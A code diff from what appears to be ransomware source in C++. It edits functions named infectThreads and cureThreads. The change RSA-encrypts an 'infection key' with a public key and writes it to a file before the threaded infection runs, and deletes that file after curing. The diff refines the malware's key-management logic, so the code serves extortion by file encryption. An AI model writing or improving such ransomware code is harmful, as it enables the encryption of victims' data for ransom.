@@ -183,6 +183,9 @@ void cureThreads(std::string privateKey, bool isSilenced)
 
 	for (auto& th : threads)
 		th.join();
+
+	std::filesystem::remove("key-used-for-infection-DO-NOT-DELETE.key");
+
 }
 
 void infectThreads(bool isSilenced)
@@ -217,6 +220,28 @@ void infectThreads(bool isSilenced)
 
 	std::string infectionKey = ss.str();
 
+	std::ofstream file("key-used-for-infection-DO-NOT-DELETE.key");
+	if (!file)
+	{
+		std::cerr << "File error" << std::endl;
+		exit(1);
+	}
+
+	try
+	{
+		std::vector<unsigned char> encryptedRSAKey = encryptRSA(infectionKey, "./public.pem");
+		file.write(reinterpret_cast<const char*>(encryptedRSAKey.data()), encryptedRSAKey.size());
+		file.close();
+	}
+	catch(const std::exception& e)
+	{
+		if (!isSilenced)
+			std::cerr << "Encrypt RSA error: " << e.what() << std::endl;
+		file.close();
+		std::filesystem::remove("key-used-for-infection-DO-NOT-DELETE.key");
+		exit(0);
+	}
+
 	for (int i = 0; i < numThreads; i++)
 	{
 		int start = i * jobSize;
@@ -239,23 +264,4 @@ void infectThreads(bool isSilenced)
 
 	for (auto& th : threads)
 		th.join();
-
-	std::ofstream file("key-used-for-infection-DO-NOT-DELETE.key");
-	if (!file)
-	{
-		std::cerr << "File error" << std::endl;
-		exit(1);
-	}
-
-	try
-	{
-		std::vector<unsigned char> encryptedRSAKey = encryptRSA(infectionKey, "./public.pem");
-		file.write(reinterpret_cast<const char*>(encryptedRSAKey.data()), encryptedRSAKey.size());
-		file.close();
-	}
-	catch(const std::exception& e)
-	{
-		if (!isSilenced)
-			std::cerr << "Encrypt RSA error: " << e.what() << std::endl;
-	}
 }
